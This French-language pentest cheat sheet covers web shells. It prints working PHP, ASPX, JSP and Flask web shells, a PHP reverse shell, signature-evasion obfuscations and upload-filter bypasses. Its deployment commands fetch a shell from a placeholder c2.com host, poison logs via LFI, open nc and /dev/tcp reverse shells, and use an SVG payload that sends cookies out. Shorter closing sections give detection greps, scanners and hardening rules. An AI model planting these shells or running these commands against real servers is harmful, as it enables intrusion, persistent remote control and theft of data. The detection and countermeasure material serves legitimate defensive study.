---
title: Web Shells
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [webshell, post-exploitation, php, upload, sécurité, web, pentest]
date: 2026-03-22
---

# Web Shells

Un web shell est un script malveillant déposé sur un serveur web permettant l'exécution de commandes à distance via HTTP. Il constitue un mécanisme de persistance et de contrôle post-exploitation après une vulnérabilité d'upload, une RCE, ou un accès en écriture sur le serveur.

## Types de web shells par langage

### PHP

```php
<?php
// Shell minimaliste — une ligne
system($_GET['cmd']);
// Usage : http://target.com/shell.php?cmd=id

// Avec authentification basique
if ($_GET['pass'] !== 'secret') { die('403'); }
system($_GET['cmd']);

// Via eval (contourne certains filtres sur system/exec)
eval(base64_decode($_POST['code']));

// Shell complet — exécution + lecture de fichiers
<?php
$cmd = $_REQUEST['cmd'];
$file = $_REQUEST['file'];
if ($cmd) { echo "<pre>" . shell_exec($cmd) . "</pre>"; }
if ($file) { echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>"; }
?>

// Reverse shell PHP
$ip='192.168.1.100'; $port=4444;
$s=fsockopen($ip,$port);
$proc=proc_open('/bin/sh',array(0=>$s,1=>$s,2=>$s),$pipes);

// Alternatives à system() (si certaines fonctions sont disabled_functions)
shell_exec($cmd);
exec($cmd, $output); echo implode("\n", $output);
passthru($cmd);
popen($cmd, 'r');
proc_open($cmd, ...);
`$cmd`;  // Backtick operator
```

### ASPX (.NET)

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
<form method="post">
  <input name="cmd" /><input type="submit" />
</form>
```

### JSP (Java)

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
        InputStream is = p.getInputStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(is));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line).append("\n");
        out.println("<pre>" + sb.toString() + "</pre>");
    }
%>
```

### Python / Flask

```python
# Dans une application Flask compromise
from flask import request
import subprocess

@app.route('/debug')
def debug():
    cmd = request.args.get('cmd', '')
    output = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.STDOUT)
    return f"<pre>{output}</pre>"
```

## Web shells avancés et frameworks

```bash
# Weevely — web shell PHP chiffré + tunnel
# Génération du shell
weevely generate MonMotDePasse /tmp/shell.php

# Connexion au shell uploadé
weevely http://target.com/uploads/shell.php MonMotDePasse

# Commandes spéciales Weevely
:file.download /etc/passwd /tmp/passwd
:file.upload /tmp/payload.sh /var/www/html/payload.sh
:sql.console                        # Console MySQL si disponible
:net.scan 192.168.1.0/24           # Scan réseau depuis le serveur
:backdoor.tcp 4444                  # Bind shell

# China Chopper — web shell minimaliste très connu
# PHP : <?php @eval($_POST['chopper']);?>
# Connexion via le client China Chopper (Windows)

# Antak (PowerShell web shell pour IIS/ASP.NET)
# Permet d'exécuter PowerShell depuis un navigateur

# b374k — shell PHP complet avec file manager, SQL, port scanner
# Disponible sur GitHub — mot de passe chiffré dans le shell
```

## Techniques d'obfuscation et d'évasion

```php
// Obfuscation PHP — contourner les détections par signature

// Encodage base64
eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7'));  // system($_GET['cmd']);

// Concaténation de variables
$f = 'sys'.'tem';
$f($_GET['cmd']);

// Appel de fonction via variable
$a = 'system';
$a($_GET['cmd']);

// chr() — construire la chaîne caractère par caractère
$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$a($_GET['cmd']);

// Rot13 + eval
eval(str_rot13('flfgrz($_TRG[\'pzq\']);'));

// Compression gzip + base64
eval(gzinflate(base64_decode('...')));

// Via preg_replace avec modificateur /e (PHP < 7.0)
preg_replace('/.*/e', $_POST['cmd'], '');

// Utilisation de call_user_func
call_user_func('system', $_GET['cmd']);

// Image PHP (polyglot) — JPEG valide + code PHP
// Le fichier commence par des octets JPEG valides, le code PHP est inséré après
// Contourne les vérifications du type MIME par magic bytes
```

```python
# Techniques d'upload pour bypasser les filtres

# 1. Extension alternative
# .php → .php5, .phtml, .phar, .php3, .php4, .shtml

# 2. Double extension
# shell.php.jpg (si la config Apache traite .php avant .jpg)

# 3. Null byte (PHP < 5.3.4)
# shell.php%00.jpg → interprété comme shell.php

# 4. Content-Type spoofing
# Changer Content-Type: application/x-php → image/jpeg dans la requête

# 5. Magic bytes
# Ajouter GIF87a en début de fichier PHP (GIF valide + code PHP)
# GIF87a <?php system($_GET['cmd']); ?>

# 6. Fichier .htaccess — forcer l'interprétation PHP
# Uploader un .htaccess avec :
# AddType application/x-httpd-php .jpg
# Puis uploader une image .jpg contenant du PHP

# 7. SVG XSS + SSRF (si upload d'images SVG autorisé)
# <svg><script>fetch('http://burp/?c='+document.cookie)</script></svg>
```

## Gestion et utilisation

```bash
# Déploiement depuis une RCE
# Uploader via la RCE elle-même
curl "http://target.com/rce?cmd=curl+http://c2.com/shell.php+-o+/var/www/html/shell.php"
curl "http://target.com/rce?cmd=wget+-O+/var/www/html/shell.php+http://c2.com/shell.php"

# Depuis un LFI + Log Poisoning
# Injecter du PHP dans les logs Apache
curl "http://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
# Accéder au log empoisonné via LFI
curl "http://target.com/?page=../../../var/log/apache2/access.log&cmd=id"

# Trouver des shells déjà présents (en tant que défenseur)
find /var/www -name "*.php" -newer /var/www/html/index.php -ls
find /var/www -name "*.php" -exec grep -l "system\|exec\|passthru\|eval" {} \;
find /var/www -name "*.php" -exec grep -l "base64_decode.*eval\|eval.*base64" {} \;

# Reverse shell depuis le web shell (passer en interactif)
# PHP reverse shell
php -r '$s=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
# Netcat
nc -e /bin/sh 192.168.1.100 4444
# Bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

## Détection côté défenseur

```bash
# Outils de détection de web shells

# PHP Malware Finder
git clone https://github.com/php-malware-finder/php-malware-finder
./pmf /var/www/html/

# Linux Malware Detect (LMD)
maldet -a /var/www/html/

# ClamAV scan
clamscan -r /var/www/html/ --log=/tmp/clamscan.log

# Recherche manuelle de patterns suspects
grep -rn "eval\s*(base64_decode\|str_rot13\|gzinflate\|gzdecode" /var/www/
grep -rn "system\|exec\|passthru\|shell_exec\|proc_open" /var/www/ --include="*.php"
grep -rn "\$_GET\|\$_POST\|\$_REQUEST" /var/www/ --include="*.php" | grep -i "eval\|exec"

# Fichiers modifiés récemment
find /var/www -name "*.php" -mtime -7 -ls

# Intégrité des fichiers (tripwire, AIDE)
aide --check
```

## Contre-mesures

```
Côté serveur web :
  ✓ Désactiver les fonctions PHP dangereuses (disable_functions dans php.ini)
    disable_functions = system,exec,shell_exec,passthru,proc_open,popen
  ✓ Stocker les uploads hors du document root (non accessible par HTTP)
  ✓ Valider le type MIME côté serveur (pas seulement Content-Type du client)
  ✓ Renommer les fichiers uploadés avec un nom aléatoire + extension forcée
  ✓ Ne pas exécuter de code dans les dossiers d'upload (noexec mount option)
  ✓ Nginx/Apache : désactiver l'interprétation PHP dans les dossiers d'upload

  Nginx :
  location /uploads/ {
      location ~* \.php$ { deny all; }
  }

  Apache :
  <Directory /var/www/html/uploads/>
      php_admin_flag engine off
      Options -ExecCGI
  </Directory>

Monitoring :
  ✓ Surveiller les fichiers créés dans le document root (auditd, inotify)
  ✓ HIDS (OSSEC, Wazuh) : alerte sur les nouveaux fichiers PHP
  ✓ WAF : bloquer les requêtes suspectes vers des fichiers inhabituels
  ✓ Analyse des logs : accès aux fichiers avec des paramètres cmd, exec, etc.
  ✓ Chkrootkit, rkhunter : audit régulier du système
```
